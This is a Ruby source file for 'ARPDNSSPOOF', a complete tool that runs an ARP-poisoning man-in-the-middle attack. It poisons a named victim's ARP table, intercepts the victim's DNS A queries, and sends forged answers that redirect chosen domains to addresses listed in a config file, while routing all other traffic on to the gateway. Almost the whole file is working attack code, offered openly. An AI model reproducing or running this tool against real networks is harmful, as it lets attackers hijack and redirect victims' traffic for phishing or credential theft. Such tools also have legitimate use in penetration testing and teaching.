#!/usr/bin/ruby

# ARPDNSSPOOF - ARPspoof and DNSspoof in one application
#
# (C) 2018 JothamB
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

require "packetfu"
require "socket"
require "hex_string"
require "colorize"

def getAdrsHash (vicIp)
	whoami = PacketFu::Utils.whoami?
	adrsHash = Hash.new
	adrsHash[:iface] = whoami[:iface]
	adrsHash[:dnsServer] = "8.8.8.8"
	adrsHash[:localIp] = whoami[:ip_saddr]
	adrsHash[:localEth] = whoami[:eth_saddr]
	adrsHash[:gwIp] = String.new
	`route -n`.each_line do |l|
		line = l.split(" ")
		if line[0] == "0.0.0.0"
			adrsHash[:gwIp] = line[1]
			break
		end
	end
	adrsHash[:gwEth] = PacketFu::Utils.arp(adrsHash[:gwIp], :iface => adrsHash[:iface])
	adrsHash[:vicIp] = vicIp
	begin
		adrsHash[:vicEth] = PacketFu::Utils.arp(adrsHash[:vicIp], :iface => adrsHash[:iface])
	rescue
		puts
		puts "You must provide a correct IP address to spoof"
		puts
		exit 1
	end
	return adrsHash
end

def getDnsHash
	dnsHash = Hash.new
	handle = File.new("arpdnsspoof.conf", "r")
	puts
	puts "Spoofing !"
	handle.each_line do |l|
		if !l.strip.empty? && l !~ /\#/
			puts l.split(" ")[0] + " -> " + l.split(" ")[1]
			hexAddr = String.new
			l.split(" ")[1].split(".").each do |n|
				hexN = n.to_i.to_s(16)
				if hexN.length == 2
					hexAddr += hexN
				else
					hexAddr += "0".to_s + hexN
				end
			end
			dnsHash[l.split(" ")[0]] = hexAddr
		end
	end
	puts
	puts "Please make sure ipv4 forwrding is off".red
	puts
	return dnsHash
end

def runArpSpoofer (adrsHash)
	Signal.trap("INT") {	# Set victims ARP table back to normal on program termination
		puts
		puts "Cleaning up and going out"
		puts
		pkt = PacketFu::ARPPacket.new
		pkt.eth_saddr = adrsHash[:localEth]
		pkt.eth_daddr = adrsHash[:vicEth]
		pkt.arp_opcode = 2
		pkt.arp_saddr_mac = adrsHash[:gwEth]
		pkt.arp_daddr_mac = adrsHash[:vicEth]
		pkt.arp_saddr_ip = adrsHash[:gwIp]
		pkt.arp_daddr_ip = adrsHash[:vicIp]
		4.times do
			pkt.to_w
			sleep 2
		end
		exit 0
	}
	pkt = PacketFu::ARPPacket.new
	pkt.eth_saddr = adrsHash[:localEth]
	pkt.eth_daddr = adrsHash[:vicEth]
	pkt.arp_opcode = 2
	pkt.arp_saddr_mac = adrsHash[:localEth]
	pkt.arp_daddr_mac = adrsHash[:vicEth]
	pkt.arp_saddr_ip = adrsHash[:gwIp]
	pkt.arp_daddr_ip = adrsHash[:vicIp]
	loop do
		pkt.to_w
		sleep 2
	end
end

def route (pkt, adrsHash)
	pkt.eth_saddr = adrsHash[:localEth]
	pkt.eth_daddr = adrsHash[:gwEth]
	pkt.to_w(adrsHash[:iface])
end

def getHexPkt (pkt)
	hexPkt = String.new
	pkt.to_s.unpack("B*")[0].split("").each_slice(4){|a, b, c, d| hexPkt += (a + b + c + d).to_i(2).to_s(16)}
	return hexPkt
end

def getTxtDnsQue (hexPkt)
	txtDnsQue = String.new
	c = 108
	while hexPkt[c..(c + 1)] != "00"
		hexPkt[c..(c + 1)].to_i(16).times do
			c += 2
			txtDnsQue += hexPkt[c..(c + 1)].to_byte_string
		end
		c += 2
		txtDnsQue += ".".to_s
	end
	return txtDnsQue.chop
end

def spoofDnsPkt (que, adrsHash, hexIp)
	hexQue = getHexPkt(que)
	sock = UDPSocket.new
	sock.send([hexQue[84..-1]].pack("H*"), 0, adrsHash[:dnsServer], 53)
	ans = PacketFu::UDPPacket.new
	hexAns = String.new
	cap = PacketFu::Capture.new(:iface => adrsHash[:iface], :start => true)
	cap.stream.each do |p|
		pkt = PacketFu::Packet.parse p
		if pkt.is_ip? && pkt.ip_saddr == adrsHash[:dnsServer] && pkt.ip_daddr == adrsHash[:localIp]
			ans = pkt
			hexAns = getHexPkt(ans)
			break if hexAns[84..87] == hexQue[84..87]
		end
	end
	sock.close
	fakeAns = PacketFu::UDPPacket.new
	fakeAns.eth_saddr = adrsHash[:localEth]
	fakeAns.eth_daddr = adrsHash[:vicEth]
	fakeAns.ip_saddr = que.ip_daddr
	fakeAns.ip_daddr = adrsHash[:vicIp]
	fakeAns.udp_sport = ans.udp_sport
	fakeAns.udp_dport = que.udp_sport
	i = 108
	while hexAns[i..(i + 1)] != "00"
		hexAns[i..(i + 1)].to_i(16).times do
			i += 2
		end
		i += 2
	end
	i += 10
	hexAns[96..99].to_i(16).times do
		if hexAns[(i + 4)..(i + 7)] == "0005"
			i += 24 + 2 * hexAns[(i + 20)..(i + 23)].to_i(16)
		elsif hexAns[(i + 4)..(i + 7)] == "0001"
			i += 32
			hexAns[(i - 8)..(i - 1)] = hexIp
		end
	end
	fakeAns.payload = [hexAns[84..-1]].pack("H*")
	fakeAns.recalc
	fakeAns.to_w(adrsHash[:iface])
end

def sniff (adrsHash)
	cap = PacketFu::Capture.new(:iface => adrsHash[:iface], :start => true)
	cap.stream.each do |p|
		pkt = PacketFu::Packet.parse p
		yield pkt if pkt.is_ip? && pkt.eth_saddr == adrsHash[:vicEth] && pkt.eth_daddr == adrsHash[:localEth]	# Get IP packets from victim to gateway
	end
end

def runRouter (adrsHash, dnsHash)
	sniff(adrsHash) {|pkt|
		if pkt.proto[2] == "UDP" && pkt.udp_dport == 53		# If the packet is DNS query
			hexPkt = getHexPkt(pkt)
			if hexPkt[-6..-5] == "01"	# If the query is of type A
				txtDnsQue = getTxtDnsQue(hexPkt)	# Get the queried host in cleartext
				time = Time.now
				toRoute = true
				dnsHash.each do |txtDomain, hexIp|
					if txtDnsQue == txtDomain	# If the query is to be spoofed
						puts ("%02d:%02d:%02d" % [time.hour, time.min, time.sec] + "   " + txtDnsQue + "	*SPOOFED*").red
						Thread.new {spoofDnsPkt(pkt, adrsHash, hexIp)}		# Send spoofed packet to the victim
						toRoute = false
					end
				end	
				if toRoute == true
					puts "%02d:%02d:%02d" % [time.hour, time.min, time.sec] + "   " + txtDnsQue
					route(pkt, adrsHash)
				end
			else				# If the query is not of type A
				route(pkt, adrsHash)	# Route the packet to the gateway
			end
		else				# If the packet is not DNS query
			route(pkt, adrsHash)	# Route the packet to the gateway
		end
	}
end

if ARGV[0] == "-h" || ARGV[0] == nil
	puts
	puts "ARPspoof and DNSspoof in one applocation"
	puts "The application spoofs only the victims ARP table and modifies DNS responses according to the information in arpdnsspoof.conf"
	puts "For the application to work ipv4 forwarding must be set off"
	puts
	puts "To start the application enter ./arpdnsspoof.rb VictimIpAddress"
	puts
else
	adrsHash = getAdrsHash(ARGV[0])               # Arrange all the needed network addresses into Hash
	dnsHash = getDnsHash			      # Arrange the information in arpdnsspoof.conf into Hash
	Thread.new {runRouter(adrsHash, dnsHash)}     # Start capturing and handling DNS packets on a different thread
	runArpSpoofer(adrsHash)                       # Start spoofing the victims ARP table
end
